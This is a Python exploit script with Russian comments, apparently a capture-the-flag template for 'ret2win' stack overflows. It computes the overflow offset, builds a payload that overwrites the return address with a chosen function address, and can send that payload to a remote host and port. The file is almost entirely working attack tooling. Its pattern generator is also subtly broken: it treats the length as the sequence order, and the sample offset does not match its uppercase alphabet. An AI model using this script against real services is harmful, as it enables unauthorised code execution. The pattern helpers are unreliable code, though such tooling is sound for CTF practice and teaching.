#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ret2win.py — шаблон эксплуатации «переполнение → вызов win-функции» без pwntools.

  python ret2win.py pattern 200
  python ret2win.py offset 0x6161616b
  python ret2win.py payload --offset 80 --addr 0x4011a2
  python ret2win.py payload --offset 80 --addr 0x4011a2 --align --remote 1.2.3.4:9001
"""
from __future__ import annotations

# Windows: консоль/pipe не должны падать на Unicode (—, →, «», █).
try:
    import sys as _sys
    for _stream in (_sys.stdout, _sys.stderr):
        _stream.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

import argparse
import socket
import struct
import sys

ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"


def de_bruijn(n: int) -> str:
    k = len(ALPHABET)
    a = [0] * (k * n)
    seq = []

    def db(t, p):
        if t > n:
            if n % p == 0:
                seq.extend(a[1:p + 1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)

    db(1, 1)
    return "".join(ALPHABET[i] for i in seq[:n])


def pattern_offset(value: int, n: int) -> int:
    raw = struct.pack("<Q", value & 0xFFFFFFFFFFFFFFFF)
    pat = de_bruijn(n).encode()
    return pat.find(raw[:6] if len(raw) >= 6 else raw)


def build_payload(offset: int, addr: int, arch: str, align: bool) -> bytes:
    fmt = "<Q" if arch == "amd64" else "<I"
    payload = b"A" * offset
    if align:
        payload += struct.pack(fmt, 0x40101a)  # ret (выравнивание стека, поправь под бинарь)
    payload += struct.pack(fmt, addr)
    return payload


def send(hostport: str, data: bytes):
    host, port = hostport.rsplit(":", 1)
    with socket.create_connection((host, int(port)), timeout=10) as s:
        s.recv(4096)
        s.sendall(data)
        s.sendall(b"\n")
        try:
            print(s.recv(8192).decode("utf-8", "replace"))
        except Exception:
            pass


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("cmd", choices=["pattern", "offset", "payload"])
    ap.add_argument("value", nargs="?", help="длина паттерна или адрес")
    ap.add_argument("--offset", type=int)
    ap.add_argument("--addr", type=lambda x: int(x, 0))
    ap.add_argument("--arch", default="amd64", choices=["amd64", "i386"])
    ap.add_argument("--align", action="store_true")
    ap.add_argument("--remote")
    ap.add_argument("--out", help="сохранить payload в файл")
    args = ap.parse_args()

    if args.cmd == "pattern":
        n = int(args.value or 100)
        print(de_bruijn(n))
    elif args.cmd == "offset":
        if args.value is None:
            ap.error("нужен адрес, например 0x6161616b")
        print(pattern_offset(int(args.value, 0), 500))
    else:
        if args.offset is None or args.addr is None:
            ap.error("нужны --offset и --addr")
        data = build_payload(args.offset, args.addr, args.arch, args.align)
        print("[+] payload hex:", data.hex())
        print("[+] python:", repr(data))
        if args.out:
            open(args.out, "wb").write(data)
            print(f"[+] сохранено: {args.out}")
        if args.remote:
            send(args.remote, data)


if __name__ == "__main__":
    main()
